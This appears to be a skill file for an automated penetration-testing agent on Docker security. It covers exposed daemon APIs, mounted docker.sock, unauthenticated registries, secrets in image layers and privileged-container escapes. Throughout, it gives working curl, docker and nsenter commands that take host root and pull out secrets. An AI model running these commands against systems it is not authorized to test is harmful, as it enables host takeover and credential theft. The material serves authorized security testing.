---
name: docker
description: Docker and container-registry security testing covering exposed daemons, registry API abuse, image-layer secrets, and common escape/misconfiguration paths
---

# Docker / Containers

Docker is the most common container runtime, and its security failures are usually configuration failures: a daemon exposed on TCP without TLS, a `docker.sock` mounted into a CI job, a registry without authentication, or a privileged container with host mounts. These turn a low-privilege foothold into host root and full data access. This skill covers the Docker daemon API, registries, images, and the classic misconfiguration escape paths - not kernel 0-days.

## Attack Surface

- Docker daemon TCP: `2375/tcp` (plaintext), `2376/tcp` (TLS), `2377` (Swarm), `4243` (deprecated), often on Docker hosts, cloud instances, and CI runners
- `docker.sock` mounted into containers/CI jobs: `/var/run/docker.sock`, `/run/docker.sock`
- Registries: Docker Hub mirrors, self-hosted registries (`5000/tcp`, Harbor, GCR/ECR/ACR), v2 API
- Images: layers, environment variables, entrypoints, configs, cached base images
- Container runtime config: privileged mode, host PID/network/mount namespaces, volume mounts, capability drops missing
- Orchestrator adjacency: Kubernetes (see `kubernetes` skill), Docker Swarm, compose deployments

## Reconnaissance

1. **Find the daemon**: port scans for 2375/2376/4243, banner grab (daemon answers `HTTP/1.1 200 OK` with JSON), `curl http://<host>:2375/version`
2. **Probe the API unauthenticated**:
   ```
   curl -s http://<host>:2375/version
   curl -s http://<host>:2375/containers/json
   curl -s http://<host>:2375/images/json
   curl -s http://<host>:2375/info
   ```
   If `version` returns JSON without TLS client certs, the daemon is wide open
3. **Find registries**: port 5000, `/v2/`, `/v2/_catalog`; check auth (`/v2/` returns `401` with `WWW-Authenticate` when protected)
4. **Source-aware**: grep for `docker.sock`, `privileged: true`, `2375`, `-v /:/host`, `mounts:`, registry creds in `.env`/CI configs
5. **Check mounts from inside a container**: `mount | grep -E '/host|/var/run'`, `ls /var/run/docker.sock`

## Key Vulnerabilities

### Exposed Docker Daemon (2375/2376) -> Host RCE

The Docker API is root-equivalent by design. From `/containers/create` + `/containers/{id}/start`, use a benign command to prove host-root access without reading files or changing host state:

```
# 1. Create a short-lived container mounting / to /host
curl -s -XPOST http://<host>:2375/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","id; test -d /host/etc && echo host-root-mounted"],
       "Binds":["/:/host"],"Privileged":true}'
# 2. Start it (save the returned container id as <id>)
curl -s -XPOST http://<host>:2375/containers/<id>/start
# 3. Read the benign command output
curl -s "http://<host>:2375/containers/<id>/logs?stdout=true&stderr=true"
# 4. Remove the stopped test container
curl -s -XDELETE "http://<host>:2375/containers/<id>?force=true"
```

This proof does not read host files or write to the host filesystem. The daemon API also exposes image pulls (registry creds), secrets in container env, and host process visibility.

### docker.sock Inside a Container/CI Job

If `/var/run/docker.sock` is mounted, the container can drive the host daemon:

```
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

Same root-equivalence: create a privileged container with `Binds:["/:/host"]` and escape to the host. This is a common CI misconfiguration (`docker.sock` mounted for Docker-in-Docker).

### Registry Exposure

Unauthenticated registry (v2 API):

```
curl -s http://<host>:5000/v2/
curl -s http://<host>:5000/v2/_catalog
curl -s http://<host>:5000/v2/<repo>/tags/list
curl -s http://<host>:5000/v2/<repo>/manifests/<tag>
```

**Pull and inspect images** for secrets (env, config, layers):

```
docker pull <host>:5000/<repo>:<tag>
docker inspect <image> --format '{{json .Config.Env}}'
docker history --no-trunc <image>                 # layer commands may contain secrets
docker save <image> -o image.tar && tar -xvf image.tar   # raw layer files
```

Registry auth weaknesses: default creds (admin/admin on Harbor/registry UIs), leaked tokens in CI, and pull-access-only tokens that still leak image configs.

### Image/Config Secrets

- `ENV`/`ARG` in Dockerfiles baked into image config: passwords, API keys, connection strings
- `.dockerignore` gaps: `.env`, keys, and configs copied into layers
- `docker history` exposes commands with secrets (never removed by later layers)
- Dockerfiles committed to source with `RUN echo $TOKEN` style leaks

### Privileged / Host-Namespace Containers

**Privileged container escape** (classic):

```
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host    # or use nsenter
nsenter --target 1 --mount --uts --ipc --net --pid sh
```

`privileged: true` grants all capabilities and host devices; with `CAP_SYS_ADMIN`, mount the host root, cgroup release_agent, or debugfs paths. Also check:
- Host PID/network namespaces (`hostPID: true`, `hostNetwork: true`) -> process/network visibility
- Volume mounts like `-v /:/host`, `/etc`, `/root/.ssh`
- `--cap-add=SYS_ADMIN` without privileged flag
- `docker exec`-style access from compromised orchestrator pods

### Compose / Swarm Misconfigs

- Compose files with `privileged: true` and host mounts deployed to prod
- Swarm join tokens leaked (attacker joins as manager)
- Exposed Docker API behind an LB without auth

## Advanced Techniques

- **Daemon API without `create` permissions**: even read-only API access (`/containers/json`, `/info`) leaks container env, image names, and configs - escalate with image pull + local extraction
- **Image pull from exposed daemon**: `docker pull` through a compromised API to exfiltrate internal images
- **Registry token abuse**: `/v2/<repo>/manifests/<tag>` with a leaked pull token reveals all tags; write tokens can overwrite images (supply chain)
- **CI Docker-in-Docker**: a job with docker.sock can replace its own image or plant host-level persistence
- **Volume backup**: mount `/etc`/`/root` into a scratch container to read host SSH keys, kubeconfigs, and TLS material

## Testing Methodology

1. Find daemons/registries via port scan and API probes
2. Enumerate API surface unauthenticated (version, containers, images, info)
3. For registries: catalog, tags, manifests; pull and inspect images for secrets
4. For daemons: demonstrate host access with a minimal non-destructive proof (marker file, `id` output)
5. Inside containers: check mounts, capabilities (`capsh --print`), and docker.sock
6. Version-gate known CVEs (e.g., runc/CVE-2019-5736, CVE-2022-0847 dirty-pipe kernel paths) - only report with version evidence

## Validation

1. Daemon RCE: show the API calls, a benign `id` result, and confirmation that the host mount is visible
2. Registry: show the catalog/tags and a secret extracted from image config/layers (redacted)
3. docker.sock: demonstrate host daemon control from inside the container
4. Privileged escape: mount/nsenter proof with a benign command, then restore state
5. Keep proofs reversible: marker files in `/tmp`, no persistence, no destructive mounts

## False Positives

- Daemon requires TLS client certs (401/handshake failure) - not exposed
- Registry returns 401 with auth required; token needed
- Image env vars contain only non-sensitive values (version strings, harmless defaults)
- `privileged: true` present but capabilities/mounts actually constrained by seccomp/apparmor - test before claiming escape
- Port 2375 open but filtered (no API response)

## Impact

- Host root via daemon API/docker.sock (the API *is* root)
- Registry/image compromise -> supply chain and secret theft
- Full data access via host mounts from privileged containers
- Lateral movement from compromised container hosts into the wider network

## Pro Tips

1. `curl http://<host>:2375/version` is the fastest root-equivalence check in containers
2. Mount `/:/host` and write a `/tmp` marker for a clean, reversible proof
3. Pull and inspect images before attacking the daemon - secrets in env/config are often the real prize
4. Check `docker history --no-trunc` - layer commands preserve secrets that later `ENV`/`ARG` lines try to hide
5. Inside any container, check for `docker.sock` and privileged mode before assuming a non-escape position
6. Pair with `kubernetes`, `ci_cd`, `exposed_databases`, and `weak_password_detection` skills

## Summary

Docker security is configuration security: exposed daemons and docker.sock are root by design, open registries leak images and secrets, and privileged/host-mounted containers provide the escape. Probe the API, pull and inspect images, and prove host access with minimal reversible markers.
